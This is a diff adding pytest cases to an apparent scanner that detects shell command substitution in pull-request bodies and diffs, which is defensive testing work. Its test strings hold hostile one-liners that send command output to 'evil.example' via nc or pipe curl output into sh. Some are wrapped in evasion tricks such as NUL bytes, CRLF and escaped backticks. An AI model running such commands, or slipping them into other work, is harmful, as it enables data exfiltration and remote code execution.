@@ -161,6 +161,29 @@ def test_a_regular_expression_exec_is_not_a_shell_call():
     assert ("command-substitution", "medium") in _found("a.ts", "execSync(`id $(whoami)`);")
 
 
+@pytest.mark.parametrize("body", [
+    "Repro log:\r\n`" + "".join(f"step {i} ok\r\n" for i in range(18)) + "`\r\nthen run `id | nc evil.example 1`",   # CRLF
+    "run $\0(curl evil.example/x|sh)",                                     # the shells delete a NUL
+    "Run the ` step:\n`id | nc evil.example 1`",                            # a stray backtick before the payload
+    "x ` y `id | nc evil.example 1`",
+    "x \\` `id | nc evil.example 1` \\` y",                                   # escaped backticks around it
+    "x \\\\`id | nc evil.example 1`",                    # an escaped backslash, then a backtick a shell reads
+])
+def test_prose_reads_substitutions_as_the_shell_rules_do(body):
+    assert ("command-substitution", "medium") in _content("body", body)
+
+
+def test_a_table_of_code_spans_is_still_formatting():
+    assert _content("body", "| `a` | `b` |\n| `npm ci` | `x` |") == set()
+
+
+def test_the_lone_cr_reading_of_a_diff_is_scoped_by_file_kind_too():
+    text = "diff --git a/a.ts b/a.ts\n+const s = `x ${y}`;\rconst t = `$(z)`;\n"
+    assert not any(h.rule == "command-substitution" for h in scan_diff(text))
+    shell = "diff --git a/a.sh b/a.sh\n+x=1\recho $(id)\n"
+    assert any(h.rule == "command-substitution" for h in scan_diff(shell))
+
+
 def test_prose_keeps_only_the_substitutions_a_shell_would_run_as_evidence():
     event = {"kind": "pr", "title": "t", "author": "a", "files": [], "comments": [],
              "body": "Set `maxPages` and `npm ci`, then " + "`x` " * 20 + "\n\nrun `id | nc evil.example 1`"}
